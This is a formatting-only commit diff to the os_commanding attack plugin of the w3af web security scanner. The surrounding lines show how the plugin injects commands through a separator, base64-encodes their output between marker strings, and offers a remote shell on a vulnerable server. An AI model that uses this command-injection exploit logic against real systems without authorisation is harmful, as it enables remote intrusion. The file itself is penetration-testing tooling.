00a0339f0b31c136c0d02fe93064b90dcc59a222
Andres Riancho <andres.riancho@gmail.com>
2014-02-25 09:58:21 -0300

    Cosmetic

--- w3af/plugins/attack/os_commanding.py
+++ w3af/plugins/attack/os_commanding.py
@@ -1,4 +1,4 @@
-'''
+"""
 os_commanding.py
 
 Copyright 2006 Andres Riancho
@@ -18,7 +18,7 @@ You should have received a copy of the GNU General Public License
 along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
-'''
+"""
 import w3af.core.controllers.output_manager as om
 import w3af.plugins.attack.payloads.shell_handler as shell_handler
 
@@ -34,10 +34,10 @@ from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
 
 class ExploitStrategy(object):
-    '''
+    """
     Base class for the different types of exploit strategies that this plugin
     can use to execute commands and get the results.
-    '''
+    """
     def __init__(self, vuln):
         self._cmd_separator = vuln['separator']
         self._remote_os = vuln['os']
@@ -61,6 +61,7 @@ class ExploitStrategy(object):
     
     def extract_result(self, http_response):
         raise NotImplementedError
+
 
 class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
     def __init__(self, vuln):
@@ -92,13 +93,14 @@ class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
     def extract_result(self, http_response):
         return self._cut(http_response.get_body())
 
+
 class FullPathExploitStrategy(ExploitStrategy):
-    '''
+    """
     This strategy allows us to retrieve binary output from the commands we run
     without any errors. Also, it returns exactly the bytes returned by the
     command without any trailing or leading \n or any guessing on the command
     result length.
-    '''
+    """
     REMOTE_CMD = "%s /bin/echo -n '%s'; %s | /usr/bin/base64 | "\
                  "/usr/bin/tr -d '\n'; /bin/echo -n '%s'"
     
@@ -124,23 +126,24 @@ class FullPathExploitStrategy(ExploitStrategy):
         except w3afException:
             return None
 
+
 class CmdsInPathExploitStrategy(FullPathExploitStrategy):
-    '''
+    """
     This strategy allows us to retrieve binary output from the commands we run
     without any errors. Also, it returns exactly the bytes returned by the
     command without any trailing or leading \n or any guessing on the command
     result length.
-    '''
+    """
     REMOTE_CMD = "%s echo -n '%s'; %s | base64 | "\
                  "tr -d '\n'; echo -n '%s'"
                  
 
 class os_commanding(AttackPlugin):
-    '''
+    """
     Exploit OS Commanding vulnerabilities.
 
     :author: Andres Riancho (andres.riancho@gmail.com)
-    '''
+    """
     EXPLOIT_STRATEGIES = [FullPathExploitStrategy, CmdsInPathExploitStrategy,
                           BasicExploitStrategy]
     
@@ -148,13 +151,13 @@ class os_commanding(AttackPlugin):
         AttackPlugin.__init__(self)
 
     def get_attack_type(self):
-        '''
+        """
         :return: The type of exploit, SHELL, PROXY, etc.
-        '''
+        """
         return 'shell'
 
     def get_kb_location(self):
-        '''
+        """
         This method should return the vulnerability names (as saved in the kb)
         to exploit. For example, if the audit.os_commanding plugin finds a
         vuln, and saves it as:
@@ -166,15 +169,15 @@ class os_commanding(AttackPlugin):
         
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
-        '''
+        """
         return ['os_commanding',]
 
     def _generate_shell(self, vuln):
-        '''
+        """
         :param vuln: The vuln to exploit.
         :return: The shell object based on the vulnerability that was passed as
                  parameter.
-        '''
+        """
         # Check if we really can execute commands on the remote server
         strategy = self._verify_vuln(vuln)
         if strategy:
@@ -187,11 +190,11 @@ class os_commanding(AttackPlugin):
             return None
 
     def _verify_vuln(self, vuln):
-        '''
+        """
         This command verifies a vuln. This is really hard work!
 
         :return : True if vuln can be exploited.
-        '''
+        """
         for StrategyKlass in self.EXPLOIT_STRATEGIES:
             
             strategy = StrategyKlass(vuln)
@@ -209,24 +212,24 @@ class os_commanding(AttackPlugin):
         return False
     
     def get_root_probability(self):
-        '''
+        """
         :return: This method returns the probability of getting a root shell
                  using this attack plugin. This is used by the "exploit *"
                  function to order the plugins and first try to exploit the
                  more critical ones. This method should return 0 for an exploit
                  that will never return a root shell, and 1 for an exploit that
                  WILL ALWAYS return a root shell.
-        '''
+        """
         return 0.8
 
     def get_long_desc(self):
-        '''
+        """
         :return: A DETAILED description of the plugin functions and features.
-        '''
-        return '''
+        """
+        return """
         This plugin exploits os commanding vulnerabilities and returns a
         remote shell.
-        '''
+        """
 
 
 class OSCommandingShell(ExecShell):
@@ -240,13 +243,13 @@ class OSCommandingShell(ExecShell):
 
     @exec_debug
     def execute(self, command):
-        '''
+        """
         This method executes a command in the remote operating system by
         exploiting the vulnerability.
 
         :param command: The command to handle ( ie. "ls", "whoami", etc ).
         :return: The result of the command.
-        '''
+        """
         strategy_cmd = self.strategy.generate_command(command)
         try:
             http_response = self.strategy.send(strategy_cmd,
@@ -262,7 +265,7 @@ class OSCommandingShell(ExecShell):
         return 'os_commanding'
 
     def __reduce__(self):
-        '''
+        """
         @see: shell.__reduce__ to understand why this is required.
-        '''
+        """
         return self.__class__, (self.strategy, None, None)
